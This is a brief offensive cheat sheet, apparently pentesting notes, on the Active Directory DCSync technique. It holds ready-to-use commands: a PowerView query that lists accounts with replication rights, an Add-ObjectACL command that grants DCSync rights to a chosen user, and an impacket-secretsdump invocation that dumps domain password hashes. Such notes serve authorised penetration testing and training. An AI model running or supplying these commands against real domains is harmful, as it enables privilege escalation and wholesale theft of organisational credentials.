# dcsync

Allows an attacker to **simulate the behavior of Domain Controller (DC) in order to retrieve password data via domain
replication**. Any member of **Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer
accounts** are able to run DCSync to pull password data.

## Check for users with DCSync

```bash
Get-ObjectAcl -DistinguishedName "dc=DOMAIN,dc=COM" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

## Usage

### using powerview

```bash
Add-ObjectACL -TargetDistinguishedName "dc=DOMAIN,dc=COM" -PrincipalIdentity USER -Rights DCSync
```

## post DCSync

```bash
impacket-secretsdump DOMAIN/USER:['PASS']@IP [-just-dc] [just-dc-user USER]
```